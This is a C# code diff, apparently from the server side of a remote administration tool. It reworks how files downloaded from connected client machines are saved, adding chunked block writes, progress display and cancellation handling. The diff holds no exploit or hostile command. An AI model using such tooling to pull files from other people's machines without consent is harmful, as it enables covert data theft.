@@ -3,6 +3,7 @@ using System.Drawing;
 using System.IO;
 using System.Threading;
 using System.Windows.Forms;
+using xServer.Core.Helper;
 using xServer.Core.Misc;
 using xServer.Core.Packets.ClientPackets;
 using xServer.Forms;
@@ -285,9 +286,16 @@ namespace xServer.Core.Commands
 			downloadPath = Path.Combine(downloadPath, packet.Filename);
 
 			bool Continue = true;
-			if (File.Exists(downloadPath))
-				if (MessageBox.Show(string.Format("The file '{0}' already exists!\nOverwrite it?", packet.Filename), "Overwrite Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != System.Windows.Forms.DialogResult.Yes)
+			if (packet.CurrentBlock == 0 && File.Exists(downloadPath))
+				if (MessageBox.Show(string.Format("The file '{0}' already exists!\nOverwrite it?", packet.Filename), "Overwrite Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) != DialogResult.Yes)
 					Continue = false;
+
+			if (client.Value.FrmFm == null)
+			{
+				new Packets.ServerPackets.DownloadFileCanceled(packet.ID).Execute(client);
+				MessageBox.Show("Please keep the File Manager open.\n\nWarning: Download aborted", "Download aborted", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+				return;
+			}
 
 			int index = 0;
 			try
@@ -305,45 +313,56 @@ namespace xServer.Core.Commands
 				});
 			}
 			catch
-			{ }
+			{
+				return;
+			}
 
 			if (Continue)
 			{
-				new Thread(() =>
+				if (!string.IsNullOrEmpty(packet.CustomMessage))
 				{
-					try
+					client.Value.FrmFm.Invoke((MethodInvoker) delegate
 					{
-						client.Value.FrmFm.Invoke((MethodInvoker)delegate
-						{
-							client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Saving...";
-						});
+						client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = packet.CustomMessage;
+						client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
+					});
+					return;
+				}
 
-						using (FileStream stream = new FileStream(downloadPath, FileMode.Create))
-						{
-							stream.Write(packet.FileByte, 0, packet.FileByte.Length);
-						}
-						client.Value.FrmFm.Invoke((MethodInvoker)delegate
-						{
-							client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Completed";
-							client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 1;
-						});
-					}
-					catch
-					{ }
-				}).Start();
-			}
-			else
-			{
-				try
+				FileSplit destFile = new FileSplit(downloadPath);
+				if (!destFile.AppendBlock(packet.Block, packet.CurrentBlock))
 				{
 					client.Value.FrmFm.Invoke((MethodInvoker)delegate
 					{
-						client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Canceled";
+						client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = destFile.LastError;
 						client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
 					});
+					return;
 				}
-				catch
-				{ }
+
+				decimal progress = Math.Round((decimal)((double)(packet.CurrentBlock + 1) / (double)packet.MaxBlocks * 100.0), 2);
+
+				client.Value.FrmFm.Invoke((MethodInvoker)delegate
+				{
+					client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = string.Format("Downloading...({0}%)", progress);
+				});
+
+				if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
+				{
+					client.Value.FrmFm.Invoke((MethodInvoker)delegate
+					{
+						client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Completed";
+						client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 1;
+					});
+				}
+			}
+			else
+			{
+				client.Value.FrmFm.Invoke((MethodInvoker)delegate
+				{
+					client.Value.FrmFm.lstTransfers.Items[index].SubItems[1].Text = "Canceled";
+					client.Value.FrmFm.lstTransfers.Items[index].ImageIndex = 0;
+				});
 			}
 		}
 
